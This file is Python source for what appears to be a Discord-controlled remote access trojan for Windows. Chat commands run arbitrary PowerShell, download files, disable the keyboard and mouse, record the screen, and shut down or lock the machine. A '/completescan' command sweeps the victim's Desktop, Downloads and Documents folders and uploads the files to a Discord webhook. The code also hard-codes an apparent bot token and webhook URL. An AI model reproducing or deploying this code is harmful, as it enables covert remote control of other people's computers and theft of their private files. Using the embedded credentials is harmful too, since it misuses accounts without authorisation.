import discord
from discord.ext import commands
import threading
import subprocess
import logging
import time
import requests
import os
from discord_module import DiscordHandler
import asyncio
import concurrent.futures

from fun_module import SystemUtility

class DiscordBotModule:
    def __init__(self, token,WEBHOOK_URL):
        self.token = token
        self.executed_commands = {}  # Dictionary to store executed commands with timestamps
        self.bot = commands.Bot(command_prefix='/', intents=self.get_intents())  # Set command prefix to '/'
        self.register_commands()
        global ALLOWED_EXTENSIONS ,DISCORD_WEBHOOK_URL,discord_handler
        DISCORD_WEBHOOK_URL = WEBHOOK_URL
        discord_handler = DiscordHandler(DISCORD_WEBHOOK_URL)
        ALLOWED_EXTENSIONS = {'.txt', '.pdf', '.png', '.jpg', '.jpeg', '.mp4', '.mp3', '.mkv', '.docx', '.xls'}
        self.utility = SystemUtility()  # Initialize SystemUtility instance



    def get_intents(self):
        intents = discord.Intents.default()
        intents.typing = True
        intents.presences = True
        intents.messages = True
        intents.guilds = True  # Enable server (guild) intents
        intents.members = True  # Enable member intents
        return intents


    
    def register_commands(self):
        @self.bot.event
        async def on_ready():
            print(f'Logged in as {self.bot.user.name}')
        @self.bot.event
        async def on_message(message):
            await self.bot.process_commands(message)

        @self.bot.command()  # Command name is set to 'pcm'
        async def pcm(ctx, *, command: str):
            try:
                output = subprocess.check_output(["powershell", command], shell=True, stderr=subprocess.STDOUT)
                await ctx.send(f'Command executed successfully:\n```{output.decode("utf-8")}```')
                self.executed_commands[command] = time.time()  # Record the timestamp of the executed command
                logging.info(f'Executed powershell command: {command}')
            except Exception as e:
                await ctx.send(f'Error executing command:\n```{str(e)}```')
                logging.error(f'Error executing powershell command: {command}, Error: {str(e)}')
        
        @self.bot.command() 
        async def install(ctx, url: str):
            try:
                response = requests.get(url, stream=True)
                file_name = os.path.basename(url)
                download_path = os.path.join(os.path.expanduser("~"), "Downloads", file_name)

                with open(download_path, 'wb') as file:
                    for chunk in response.iter_content(chunk_size=8192):
                        file.write(chunk)

                await ctx.send(f'File downloaded successfully: {file_name}')
                logging.info(f'File downloaded: {file_name}')

            except Exception as e:
                await ctx.send(f'Error downloading file:\n```{str(e)}```')
                logging.error(f'Error downloading file: {str(e)}')

        
        
        @self.bot.command()
        async def h(ctx):
            help_message = (
    "Available commands:\n"
    "/black_screen <duration_seconds> - Black the screen for a specified duration.\n"
    "/disable_keyboard <duration_seconds> - Disable the keyboard for a specified duration.\n"
    "/open_microsoft_edge <search_term> - Open Microsoft Edge with a specified search term.\n"
    "/close_task <task_name> - Close a specified task.\n"
    "/open_task <task_name> - Open a specified task.\n"
    "/show_message <title> <message> - Show a message box with a specified title and message.\n"
    "/disable_mouse <duration_seconds> - Disable the mouse for a specified duration.\n"
    "/toggle_volume - Toggle system volume (mute/unmute).\n"
    "/change_wallpaper <wallpaper_path> - Change the system wallpaper.\n"
    "/open_application <app_path> - Open a specified application.\n"
    "/record_screen <duration_seconds> <output_path> - Record the screen for a specified duration.\n"
    "/lock_screen - Lock the system screen.\n"
    "/log_off - Log off the current user.\n"
    "/hibernate - Hibernate the system.\n"
    "/shutdown - Shutdown the system.\n"
    "/restart - Restart the system.\n"
    "/sleep - Put the system to sleep.\n"
    "\nUsage examples:\n"
    "/black_screen 10 - Black the screen for 10 seconds.\n"
    "/disable_keyboard 5 - Disable the keyboard for 5 seconds.\n"
    "/open_microsoft_edge example.com - Open Microsoft Edge and search for 'example.com'.\n"
    "/close_task notepad.exe - Close the 'notepad.exe' task.\n"
    "/open_task calculator.exe - Open the 'calculator.exe' task.\n"
    "/show_message 'Test' 'Hello, World!' - Show a message box with title 'Test' and message 'Hello, World!'.\n"
    "/disable_mouse 3 - Disable the mouse for 3 seconds.\n"
    "/toggle_volume - Toggle system volume.\n"
    "/change_wallpaper C:\\path\\to\\wallpaper.jpg - Change the system wallpaper to the specified path.\n"
    "/open_application C:\\path\\to\\app.exe - Open the specified application.\n"
    "/record_screen 10 C:\\path\\to\\output.mp4 - Record the screen for 10 seconds and save to the specified path.\n"
    "/lock_screen - Lock the system screen.\n"
    "/log_off - Log off the current user.\n"
    "/hibernate - Hibernate the system.\n"
    "/shutdown - Shutdown the system.\n"
    "/restart - Restart the system.\n"
    "/sleep - Put the system to sleep.\n"
    "\nWarning: Use these commands responsibly and only on your own systems."
)

            

            message_chunks = self.split_long_message(help_message)
    
            # Send each chunk as a separate message
            for chunk in message_chunks:
                await ctx.send(chunk)
        
        @self.bot.command()
        async def completescan(ctx):
            try:
                await self.scan_and_send_files(DiscordHandler(DISCORD_WEBHOOK_URL),ctx)
            except Exception as e:
                print(f"Error scanning and sending files: {e}")
                await ctx.send(f"Error scanning and sending files: {e}")

        
        
        @self.bot.command()
        async def black_screen(ctx, duration_seconds: int):
            success, error = self.utility.black_screen(duration_seconds)
            if success:
                await ctx.send("Screen blacked successfully.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def disable_keyboard(ctx, duration_seconds: int):
            success, error = self.utility.disable_keyboard(duration_seconds)
            if success:
                await ctx.send("Keyboard disabled successfully.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def open_microsoft_edge(ctx, search_term: str):
            success, error = self.utility.open_microsoft_edge(search_term)
            if success:
                await ctx.send("Microsoft Edge opened successfully.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def close_task(ctx, task_name: str):
            success, error = self.utility.close_task(task_name)
            if success:
                await ctx.send("Task closed successfully.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def open_task(ctx, task_name: str):
            success, error = self.utility.open_task(task_name)
            if success:
                await ctx.send("Task opened successfully.")
            else:
                await ctx.send(f"Error: {error}")

        #just old message
        @self.bot.command()
        async def show_message(ctx, title: str, message: str):
            success, error = self.utility.show_message(title, message)
            if success:
                await ctx.send("Message shown successfully.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def disable_mouse(ctx, duration_seconds: int):
            success, error = self.utility.disable_mouse(duration_seconds)
            if success:
                await ctx.send("Mouse disabled successfully.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def shutdown(ctx):
            success, error = self.utility.shutdown()
            if success:
                await ctx.send("System is shutting down.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def restart(ctx):
            success, error = self.utility.restart()
            if success:
                await ctx.send("System is restarting.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def sleep(ctx):
            success, error = self.utility.sleep()
            if success:
                await ctx.send("System is going to sleep.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def lock_screen(ctx):
            success, error = self.utility.lock_screen()
            if success:
                await ctx.send("System screen locked successfully.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def log_off(ctx):
            success, error = self.utility.log_off()
            if success:
                await ctx.send("User logged off successfully.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def hibernate(ctx):
            success, error = self.utility.hibernate()
            if success:
                await ctx.send("System is hibernating.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def toggle_volume(ctx):
            success, error = self.utility.toggle_volume()
            if success:
                await ctx.send("System volume toggled.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def change_wallpaper(ctx, wallpaper_path: str):
            success, error = self.utility.change_wallpaper(wallpaper_path)
            if success:
                await ctx.send("Wallpaper changed successfully.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def open_application(ctx, app_path: str):
            success, error = self.utility.open_application(app_path)
            if success:
                await ctx.send(f"Application '{app_path}' opened successfully.")
            else:
                await ctx.send(f"Error: {error}")

        @self.bot.command()
        async def record_screen(ctx, duration_seconds: int, output_path: str):
            success, error = self.utility.record_screen(duration_seconds, output_path)
            if success:
                await ctx.send(f"Screen recorded successfully. Output file: {output_path}")
            else:
                await ctx.send(f"Error: {error}")


    
        
    
    def start(self):
        self.bot.run(self.token)
        
    async def get_valid_files(self, desktop_path, downloads_path, documents_path, max_file_size_mb=5):
        max_file_size_bytes = max_file_size_mb * 1024 * 1024  # Convert MB to bytes
        valid_files = []

        for root_dir in [desktop_path, downloads_path, documents_path]:
            for foldername, _, filenames in os.walk(root_dir):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    _, extension = os.path.splitext(filename)

                    if extension.lower() in ALLOWED_EXTENSIONS:
                        try:
                            # Get file size in bytes and compare with the maximum allowed size
                            file_size_bytes = os.path.getsize(file_path)
                            if file_size_bytes <= max_file_size_bytes:
                                valid_files.append(file_path)
                        except OSError as e:
                            print(f"Error getting file size for '{file_path}': {e}")
                            # Handle the error as needed (skip the file, log the error, etc.)

        return valid_files
    # Function to split long messages into chunks
    def split_long_message(self, message):
        max_length = 2000
        chunks = [message[i:i+max_length] for i in range(0, len(message), max_length)]
        return chunks   
    async def scan_and_send_files(self, discord_module, ctx):
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        download_path = os.path.join(os.path.expanduser("~"), "Downloads")
        documents_path = os.path.join(os.path.expanduser("~"), "Documents")
        
        valid_files = await self.get_valid_files(desktop_path, download_path, documents_path)
        if valid_files:
            await ctx.send(f"Found {len(valid_files)} valid files.")
            await ctx.send(f"Founded files are: {valid_files} valid files.")
            await ctx.send(f"Check the group rknotes for files.")
            await self.send_files_to_discord(valid_files, discord_module, ctx)
    
    async def send_files_to_discord(self, file_paths, discord_module, ctx):
        loop = asyncio.get_event_loop()  # Get the event loop
        with concurrent.futures.ThreadPoolExecutor(loop=loop) as executor:
            futures = [loop.run_in_executor(executor, self.send_file_to_discord, file_path, discord_module, ctx) for file_path in file_paths]
            await asyncio.gather(*futures)

    def send_file_to_discord(self, file_path, discord_module, ctx):
        if os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as file_obj:
                    asyncio.run_coroutine_threadsafe(discord_module.send_file(file_obj, filename=os.path.basename(file_path)), loop=self.loop)
                    print(f"File sent successfully: {file_path}")
                    asyncio.run_coroutine_threadsafe(ctx.send(f"File sent successfully: {file_path}"), loop=self.loop)
            except Exception as e:
                print(f"Error sending file '{file_path}': {e}")
                asyncio.run_coroutine_threadsafe(ctx.send(f"Error sending file '{file_path}': {e}"), loop=self.loop)
        else:
            print(f"File not found: {file_path}")
            asyncio.run_coroutine_threadsafe(ctx.send(f"File not found: {file_path}"), loop=self.loop)


        
# Example usage:
if __name__ == '__main__':
    bot_token = "MTE3MTY1NjY0NDkxNzIxOTMzOQ.GXrRle.riejiiw1ovEBPj8KR612f6_BsqgttI-XuL83WU"
    DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1167795441220460574/uIb8VBmgbM41RcWNe2yFowlrkm_n5yIFavDkN9L5ka5KbWNBwey6_AxCSkSWxRXyfmGU"
    bot_module = DiscordBotModule(bot_token,DISCORD_WEBHOOK)

    # Start the bot in a separate thread
    bot_thread = threading.Thread(target=bot_module.start, daemon=True)
    bot_thread.start()
    
    while True:
        pass
